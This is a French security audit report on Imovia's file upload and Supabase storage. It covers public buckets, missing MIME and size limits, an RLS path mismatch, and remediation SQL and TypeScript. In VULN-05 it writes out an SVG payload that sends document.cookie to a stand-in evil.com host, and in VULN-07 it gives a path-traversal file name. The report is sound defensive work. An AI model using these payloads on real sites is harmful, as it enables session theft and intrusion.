# Rapport d'Audit de Sécurité — Upload & Stockage de Fichiers

**Application :** Imovia  
**Date :** 6 mai 2026  
**Périmètre :** Upload de fichiers, buckets Supabase Storage, politiques RLS, composants frontend  
**Auditeur :** Pentest Security Expert

---

## Résumé exécutif

L'audit révèle **12 vulnérabilités** dont **3 critiques**, **4 hautes**, **3 moyennes** et **2 faibles**. Les risques majeurs sont : l'absence totale de validation côté serveur des types de fichiers et tailles, un bucket `property-images` rendu public sans restriction permettant l'énumération, et un bypass de la politique RLS pour les uploads de documents via le frontend web qui utilise un schéma de chemin incompatible avec les policies en base.

---

## Table des vulnérabilités

| # | Sévérité | Vulnérabilité |
|---|----------|---------------|
| 1 | CRITIQUE | Aucune validation serveur du type MIME / extension de fichier |
| 2 | CRITIQUE | Bucket `property-images` public — accès direct sans authentification |
| 3 | CRITIQUE | Bypass RLS : le frontend web uploade les documents avec un chemin `user.id/` au lieu de `leases/leaseId/` |
| 4 | HAUTE | Absence de limite de taille par bucket (50 MiB global) |
| 5 | HAUTE | Upload de fichiers exécutables possible (SVG, HTML, JS) |
| 6 | HAUTE | Aucun scan antivirus/malware sur les fichiers uploadés |
| 7 | HAUTE | Noms de fichiers non sanitisés — risque de path traversal |
| 8 | MOYENNE | Spoofing MIME type sur l'app mobile |
| 9 | MOYENNE | Bucket `avatars` public — exposition inutile des photos de profil |
| 10 | MOYENNE | Isolation inter-tenants faible sur le bucket `property-images` |
| 11 | FAIBLE | URL publiques de stockage prévisibles / énumérables |
| 12 | FAIBLE | Absence de Content-Security-Policy sur les objets stockés |

---

## Détail des vulnérabilités

---

### VULN-01 — Aucune validation serveur du type MIME / extension de fichier

**Sévérité : CRITIQUE**  
**CVSS :** 9.1  
**CWE :** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Fichiers concernés :**

- `frontend/site/src/components/dashboard/owner/documents/add-document-dialog.tsx` (ligne 133-135)
- `frontend/site/src/components/dashboard/owner/properties/property-form.tsx` (ligne 151-153)
- `frontend/site/src/components/dashboard/profile/personal-info-form.tsx` (ligne 98-100)
- `supabase/config.toml` (ligne 112 — aucune `allowed_mime_types` configurée)
- `supabase/migrations/20260218150000_media_storage_buckets.sql` (aucune contrainte MIME dans les policies)

**Description :**  
Aucun des trois buckets (`documents`, `property-images`, `avatars`) ne définit de liste blanche de types MIME au niveau de Supabase Storage. La seule protection est l'attribut HTML `accept` côté client, qui est trivialement contournable.

Les appels `supabase.storage.from('...').upload(filePath, file)` transmettent le fichier sans aucune option `contentType` restrictive côté web (le Content-Type est dérivé du fichier lui-même).

**Preuve :**  
Dans `config.toml`, la configuration des buckets est commentée :

```
# [storage.buckets.images]
# public = false
# file_size_limit = "50MiB"
# allowed_mime_types = ["image/png", "image/jpeg"]
```

Aucune migration ne crée les buckets avec `file_size_limit` ou `allowed_mime_types`.

**Scénario d'exploitation :**
1. Un attaquant authentifié intercepte la requête d'upload via Burp Suite
2. Il remplace le fichier PDF par un fichier `.html` contenant du JavaScript malveillant
3. Le fichier est stocké avec succès dans le bucket `documents`
4. Si un autre utilisateur ouvre l'URL publique du fichier, le script s'exécute (XSS stocké)

**Correction recommandée :**

```sql
-- Dans une migration, configurer les buckets avec des restrictions
UPDATE storage.buckets
SET file_size_limit = 10485760,  -- 10 MB
    allowed_mime_types = ARRAY['application/pdf', 'image/jpeg', 'image/png', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document']
WHERE id = 'documents';

UPDATE storage.buckets
SET file_size_limit = 5242880,  -- 5 MB
    allowed_mime_types = ARRAY['image/jpeg', 'image/png', 'image/webp']
WHERE id = 'property-images';

UPDATE storage.buckets
SET file_size_limit = 2097152,  -- 2 MB
    allowed_mime_types = ARRAY['image/jpeg', 'image/png', 'image/webp']
WHERE id = 'avatars';
```

Ajouter aussi une validation côté serveur (edge function ou middleware) pour vérifier le magic number du fichier, pas seulement l'extension.

---

### VULN-02 — Bucket `property-images` public — accès sans authentification

**Sévérité : CRITIQUE**  
**CVSS :** 8.6  
**CWE :** CWE-284 (Improper Access Control)

**Fichiers concernés :**

- `supabase/migrations/20260220232500_make_property_images_public.sql` (lignes 3-5, 8-16)
- `supabase/migrations/20260221123000_public_media_buckets_alignment.sql` (lignes 8-10, 12-18)

**Description :**  
Deux migrations successives rendent le bucket `property-images` public avec une politique SELECT sans aucune restriction :

```sql
-- 20260220232500
UPDATE storage.buckets SET public = true WHERE id = 'property-images';

CREATE POLICY property_images_storage_read ON storage.objects
AS PERMISSIVE FOR SELECT TO public
USING (bucket_id = 'property-images');
```

La migration `20260221123000` fait de même et supprime aussi les restrictions sur `avatars`.

**Remarque :** La migration `20260220241000_property_images_backend_alignment.sql` (lignes 68-93) tente de restaurer une policy plus restrictive avec vérification de propriété/bail, mais elle cible uniquement le rôle `authenticated`. Or le bucket étant `public = true`, les fichiers sont directement accessibles via URL sans authentification, rendant cette politique RLS caduque.

**Scénario d'exploitation :**
1. Un attaquant non authentifié accède à `https://<supabase-url>/storage/v1/object/public/property-images/properties/<uuid>/image.jpg`
2. En énumérant les UUIDs (ou via des fuites d'information), il peut télécharger toutes les photos de biens immobiliers
3. Cela expose potentiellement des informations sensibles visibles sur les photos (adresses, intérieurs, objets de valeur)

**Correction recommandée :**

```sql
UPDATE storage.buckets SET public = false WHERE id = 'property-images';
```

Utiliser des URLs signées (`createSignedUrl`) avec expiration pour le frontend au lieu de `getPublicUrl`. Adapter `storage-utils.ts` :

```typescript
export async function getSignedImageUrl(path: string, bucket = 'property-images'): Promise<string> {
    if (!path) return ''
    if (path.startsWith('http')) return path
    const supabase = createClient()
    const { data, error } = await supabase.storage
        .from(bucket)
        .createSignedUrl(path, 3600) // 1h expiration
    return data?.signedUrl || ''
}
```

---

### VULN-03 — Bypass RLS : chemin d'upload incohérent pour les documents (frontend web)

**Sévérité : CRITIQUE**  
**CVSS :** 8.8  
**CWE :** CWE-863 (Incorrect Authorization)

**Fichiers concernés :**

- `frontend/site/src/components/dashboard/owner/documents/add-document-dialog.tsx` (lignes 129-135)
- `supabase/migrations/20260218113647_remote_schema.sql` (lignes 1710-1715 — policy `documents_storage_insert`)

**Description :**  
La politique RLS pour l'insertion dans le bucket `documents` exige que le chemin commence par `leases/` et que le 2ᵉ segment soit un UUID de bail valide :

```sql
WITH CHECK (
  bucket_id = 'documents'
  AND split_part(name, '/', 1) = 'leases'
  AND (is_lease_owner(...) OR is_lease_tenant(...))
);
```

Or, le composant web `add-document-dialog.tsx` utilise un chemin basé sur le `user.id` :

```typescript
const filePath = `${user.id}/${fileName}`   // ex: "abc123-uuid/0.4523.pdf"
```

Ce chemin ne commence **pas** par `leases/` et ne contient pas de `lease_id`.

**Conséquences :**

1. **Soit l'upload échoue silencieusement** (la politique bloque) et les documents web ne sont jamais stockés — c'est un bug fonctionnel critique
2. **Soit la politique a été modifiée/désactivée en production** pour permettre ce chemin, ce qui signifie que n'importe quel utilisateur authentifié peut écrire n'importe où dans le bucket `documents` — c'est une faille de sécurité critique

L'app mobile (`AjouterDocumentModal.tsx` ligne 249) utilise correctement `leases/${lease.id}/${fileName}`.

**Correction recommandée :**  
Aligner le frontend web sur le même schéma que l'app mobile :

```typescript
// add-document-dialog.tsx — remplacer lignes 129-131
const lease = await fetchActiveLeaseForProperty(property) // récupérer le bail actif
const fileExt = selectedFile.name.split('.').pop()
const fileName = `${Date.now()}.${fileExt}`
const filePath = `leases/${lease.id}/${fileName}`
```

---

### VULN-04 — Absence de limite de taille par bucket

**Sévérité : HAUTE**  
**CVSS :** 6.5  
**CWE :** CWE-400 (Uncontrolled Resource Consumption)

**Fichiers concernés :**

- `supabase/config.toml` (ligne 112)
- `supabase/migrations/20260218150000_media_storage_buckets.sql` (lignes 4-8 — aucun `file_size_limit`)

**Description :**  
La limite globale est de 50 MiB, ce qui est excessif pour des photos de profil ou des images de biens. Aucun bucket ne définit sa propre limite. Un utilisateur malveillant peut uploader des fichiers de 50 Mo par requête, saturant rapidement le stockage.

**Scénario d'exploitation :**
1. Un attaquant crée un compte, obtient un bail
2. Il uploade en boucle des fichiers de 50 Mo dans le bucket `documents`
3. Le stockage Supabase atteint sa limite, causant un déni de service

**Correction recommandée :**  
Définir des limites adaptées à chaque bucket (voir VULN-01).

---

### VULN-05 — Upload de fichiers exécutables (SVG, HTML, JS)

**Sévérité : HAUTE**  
**CVSS :** 7.4  
**CWE :** CWE-434

**Fichiers concernés :**

- `frontend/site/src/components/dashboard/owner/properties/property-form.tsx` (ligne 243 — `accept="image/*"`)
- `frontend/site/src/components/dashboard/profile/personal-info-form.tsx` (ligne 153 — `accept="image/*"`)

**Description :**  
L'attribut HTML `accept="image/*"` autorise les fichiers SVG, qui peuvent contenir du JavaScript embarqué. De plus, l'attribut `accept` est une suggestion côté navigateur, pas une contrainte. Aucune validation serveur n'existe.

**Scénario d'exploitation :**
1. Un attaquant uploade un fichier SVG contenant : `<svg onload="fetch('https://evil.com/steal?cookie='+document.cookie)">`
2. Le fichier est stocké dans `property-images` (bucket public)
3. Quand un autre utilisateur visite la page du bien, le SVG s'affiche via `<Image>` de Next.js — si le navigateur interprète le SVG directement (accès URL direct), le JS s'exécute

**Correction recommandée :**
- Restreindre `allowed_mime_types` à `['image/jpeg', 'image/png', 'image/webp']` au niveau du bucket
- Ajouter le header `Content-Disposition: attachment` pour les fichiers non-image
- Servir les fichiers depuis un domaine séparé (CDN) pour isoler les cookies

---

### VULN-06 — Aucun scan antivirus/malware

**Sévérité : HAUTE**  
**CVSS :** 6.8  
**CWE :** CWE-509 (Replicating Malicious Code)

**Fichiers concernés :** Tous les composants d'upload.

**Description :**  
Aucune étape de scan antivirus n'est implémentée entre l'upload et la mise à disposition du fichier. Les documents (PDF, DOCX) peuvent contenir des macros malveillantes ou des exploits.

**Correction recommandée :**
- Intégrer un webhook Supabase Storage → Cloud Function → ClamAV (ou service commercial comme VirusTotal API)
- Mettre le fichier en quarantaine (dossier `_pending/`) jusqu'au scan positif
- Supprimer automatiquement les fichiers détectés comme malveillants

---

### VULN-07 — Noms de fichiers non sanitisés — risque de path traversal

**Sévérité : HAUTE**  
**CVSS :** 7.2  
**CWE :** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

**Fichiers concernés :**

- `frontend/site/src/components/dashboard/owner/documents/add-document-dialog.tsx` (lignes 129-131)
- `frontend/site/src/components/dashboard/owner/properties/property-form.tsx` (lignes 145-147)
- `frontend/site/src/components/dashboard/profile/personal-info-form.tsx` (lignes 95-96)

**Description :**  
L'extension du fichier est extraite directement du nom original sans aucune sanitisation :

```typescript
const fileExt = selectedFile.name.split('.').pop()
const fileName = `${Math.random()}.${fileExt}`
```

Si un attaquant nomme son fichier `exploit.pdf/../../malicious`, l'extension extraite sera `../../malicious`, créant un chemin potentiellement dangereux.

**Note atténuante :** Supabase Storage lui-même bloque certains patterns de path traversal au niveau API, mais cette protection ne devrait pas être la seule ligne de défense.

**Correction recommandée :**

```typescript
function sanitizeFileExtension(filename: string): string {
    const ext = filename.split('.').pop()?.toLowerCase() || ''
    const allowed = ['jpg', 'jpeg', 'png', 'webp', 'pdf', 'doc', 'docx']
    return allowed.includes(ext) ? ext : 'bin'
}

function generateSafeFileName(originalName: string): string {
    const ext = sanitizeFileExtension(originalName)
    return `${crypto.randomUUID()}.${ext}`
}
```

---

### VULN-08 — Spoofing MIME type sur l'app mobile

**Sévérité : MOYENNE**  
**CVSS :** 5.3  
**CWE :** CWE-345 (Insufficient Verification of Data Authenticity)

**Fichiers concernés :**

- `frontend/application/components/documents/AjouterDocumentModal.tsx` (ligne 257)
- `frontend/application/components/biens/AjouterBienModal.tsx` (lignes 265, 279)

**Description :**

L'app mobile fait confiance au MIME type rapporté par le document picker :

```typescript
contentType: file.mimeType || "application/octet-stream"
```

Et pour les images de biens :

```typescript
const mimeType = ext === 'png' ? 'image/png' : 'image/jpeg';
```

Le type MIME est dérivé de l'extension et non du contenu réel du fichier. Un fichier renommé `.jpg` contenant du HTML sera stocké avec `Content-Type: image/jpeg` mais le contenu sera du HTML.

De plus, le fallback `application/octet-stream` dans `AjouterDocumentModal.tsx` est dangereux car il permet de stocker n'importe quel type de fichier binaire.

**Correction recommandée :**
- Valider le magic number (premiers octets) du fichier avant upload
- Ne jamais utiliser `application/octet-stream` comme fallback : rejeter le fichier si le type est inconnu

---

### VULN-09 — Bucket `avatars` rendu public sans nécessité

**Sévérité : MOYENNE**  
**CVSS :** 4.3  
**CWE :** CWE-284

**Fichiers concernés :**

- `supabase/migrations/20260221123000_public_media_buckets_alignment.sql` (lignes 8-10, 20-26)

**Description :**

Le bucket `avatars` est rendu public avec une policy SELECT sans restriction :

```sql
UPDATE storage.buckets SET public = true WHERE id IN ('property-images', 'avatars');

CREATE POLICY avatars_storage_read ON storage.objects
AS PERMISSIVE FOR SELECT TO public
USING (bucket_id = 'avatars');
```

Cela expose toutes les photos de profil de tous les utilisateurs à n'importe qui connaissant l'URL, y compris des utilisateurs non authentifiés. Combiné avec l'énumération des UUIDs, cela peut faciliter le profilage des utilisateurs.

**Correction recommandée :**  
Rendre le bucket privé et utiliser des URLs signées, ou au minimum restreindre la lecture aux utilisateurs authentifiés.

---

### VULN-10 — Isolation inter-tenants faible sur `property-images`

**Sévérité : MOYENNE**  
**CVSS :** 5.4  
**CWE :** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Fichiers concernés :**

- `supabase/migrations/20260220232500_make_property_images_public.sql` (lignes 8-16)
- `supabase/migrations/20260221123000_public_media_buckets_alignment.sql` (lignes 12-18)

**Description :**

Le bucket `property-images` étant public, **tous** les fichiers de **tous** les propriétaires sont accessibles sans authentification. Il n'y a aucune isolation entre les locataires/propriétaires. Un propriétaire A peut voir les photos des biens du propriétaire B.

Même avant que le bucket soit rendu public, la policy initiale (migration `20260218150000`) autorisait la lecture pour toute propriété avec `status = 'available'`, ce qui est acceptable pour les annonces mais peut exposer des photos de biens en cours de maintenance ou retirés du marché si le statut change après la mise en ligne des photos.

**Correction recommandée :**
- Rendre le bucket privé
- Utiliser `createSignedUrl` avec des tokens courts (1h) pour l'affichage

---

### VULN-11 — URLs de stockage prévisibles / énumérables

**Sévérité : FAIBLE**  
**CVSS :** 3.7  
**CWE :** CWE-200 (Exposure of Sensitive Information)

**Fichiers concernés :**

- `frontend/site/src/lib/supabase/storage-utils.ts` (lignes 18-22)
- `frontend/site/src/components/dashboard/profile/personal-info-form.tsx` (lignes 104-106)

**Description :**

Les URLs publiques suivent un schéma prévisible :  
`https://<project>.supabase.co/storage/v1/object/public/<bucket>/<path>`

Combiné avec les UUIDs de propriétés (exposés dans les URLs de l'application), un attaquant peut construire les URLs de toutes les images d'un bien.

De plus, `storage-utils.ts` (ligne 14) accepte n'importe quelle URL commençant par `http` sans validation du domaine :

```typescript
if (path.startsWith('http')) return path
```

Un attaquant pourrait injecter une URL externe malveillante dans le champ `storage_path` de la base de données, qui serait ensuite affichée comme image dans l'application (open redirect / phishing).

**Correction recommandée :**
- Valider que les URLs retournées correspondent au domaine Supabase attendu
- Utiliser des URLs signées avec expiration

---

### VULN-12 — Absence de Content-Security-Policy sur les objets stockés

**Sévérité : FAIBLE**  
**CVSS :** 3.1  
**CWE :** CWE-16 (Configuration)

**Description :**  
Les fichiers servis par Supabase Storage n'ont pas de header `Content-Security-Policy` ni `X-Content-Type-Options: nosniff` personnalisé. Combiné avec VULN-05, un fichier HTML/SVG uploadé pourrait être exécuté par le navigateur.

**Correction recommandée :**
- Configurer les headers de réponse de Supabase Storage (via config ou proxy inverse) :
  - `X-Content-Type-Options: nosniff`
  - `Content-Disposition: attachment` pour les fichiers non-image
  - `Content-Security-Policy: default-src 'none'`

---

## Constatation supplémentaire : Placeholder Unsplash non sécurisé

**Fichier :** `frontend/site/src/components/dashboard/owner/properties/property-form.tsx` (lignes 183-188)

```typescript
storage_path: "https://images.unsplash.com/photo-1502672260266-...",
```

Un URL externe Unsplash est injecté comme `storage_path` dans la table `property_images` quand aucune image n'est uploadée. Cela :
- Introduit une dépendance à un service tiers
- Contourne le trigger `trg_property_images_validate_path` qui attend un chemin `properties/<uuid>/...` (l'URL complète ne sera pas un UUID valide au 2ᵉ segment)
- Peut être exploité par un attaquant pour injecter d'autres URLs externes

---

## Matrice de risque

```
              Impact
            Faible  Moyen  Élevé  Critique
Probabilité
  Élevée     11,12   8,9    4,7    1,2,3
  Moyenne             10     5,6
  Faible
```

---

## Recommandations prioritaires

### Immédiat (Sprint 0 — cette semaine)

1. **Configurer `allowed_mime_types` et `file_size_limit` sur chaque bucket** via une migration SQL
2. **Rendre le bucket `property-images` privé** et migrer vers `createSignedUrl`
3. **Corriger le chemin d'upload dans `add-document-dialog.tsx`** pour utiliser `leases/<leaseId>/`

### Court terme (Sprint 1)

4. Implémenter la validation côté serveur du contenu réel des fichiers (magic bytes)
5. Sanitiser les noms/extensions de fichiers dans tous les composants d'upload
6. Ajouter `X-Content-Type-Options: nosniff` et `Content-Disposition` sur les réponses Storage
7. Rendre le bucket `avatars` privé ou restreindre aux utilisateurs authentifiés

### Moyen terme (Sprint 2-3)

8. Mettre en place un pipeline de scan antivirus (ClamAV ou VirusTotal)
9. Implémenter un système de quarantaine pour les fichiers uploadés
10. Ajouter une validation d'URL dans `storage-utils.ts` (whitelist de domaines)
11. Supprimer le placeholder Unsplash et utiliser une image locale par défaut

---

## Annexe : Inventaire des points d'upload

| Composant | Bucket | Chemin | Validation client | Validation serveur |
|-----------|--------|--------|-------------------|-------------------|
| `add-document-dialog.tsx` | `documents` | `${user.id}/${random}.${ext}` | `accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"` | Aucune |
| `property-form.tsx` | `property-images` | `properties/${propertyId}/${random}.${ext}` | `accept="image/*"` | Aucune |
| `personal-info-form.tsx` | `avatars` | `profiles/${user.id}/${random}.${ext}` | `accept="image/*"` | Aucune |
| `AjouterDocumentModal.tsx` (mobile) | `documents` | `leases/${leaseId}/${timestamp}.${ext}` | Document picker natif | Aucune |
| `AjouterBienModal.tsx` (mobile) | `property-images` | `properties/${propertyId}/${timestamp}_${random}.jpg` | Image picker natif | Aucune |

---

*Fin du rapport. Classification : CONFIDENTIEL — Usage interne uniquement.*
